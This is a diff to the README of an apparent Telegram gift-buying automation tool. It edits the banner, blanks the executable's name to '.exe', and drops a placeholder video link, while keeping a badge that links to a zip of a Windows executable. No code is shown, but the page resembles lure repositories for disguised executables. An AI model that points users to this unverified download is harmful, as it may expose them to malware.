@@ -2,7 +2,7 @@
 
 <div align="center">
 
-![Telegram Auto Gift Buyer Banner](./assets/banner.svg)
+![Telegram Auto Gift Buyer Banner](./assets/banner.png)
 
 [![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge&logo=windows)](https://github.com/Crimsonaebuild32/telegram-auto-gift-buyer/releases/download/auto-gifter/telegram-auto-gift-buyer.zip)
 [![Version](https://img.shields.io/badge/version-2.0.0-blue?style=for-the-badge)](https://github.com/Crimsonaebuild32/telegram-auto-gift-buyer/releases)
@@ -103,7 +103,7 @@
 
 ### 📦 What's Included
 
-- `TelegramAutoGiftBuyer.exe` - Main application executable
+- `.exe` - Main application executable
 - `config.json` - Configuration template
 - `README.txt` - Quick start instructions
 - `LICENSE.txt` - Software license
@@ -136,10 +136,6 @@
 
 5. **Start Using**
    - You're ready to automate gift purchases!
-
-### 🎥 Video Tutorial
-
-[Watch Installation Video](https://youtube.com/watch?v=example) - Complete walkthrough (5 minutes)
 
 ---
 
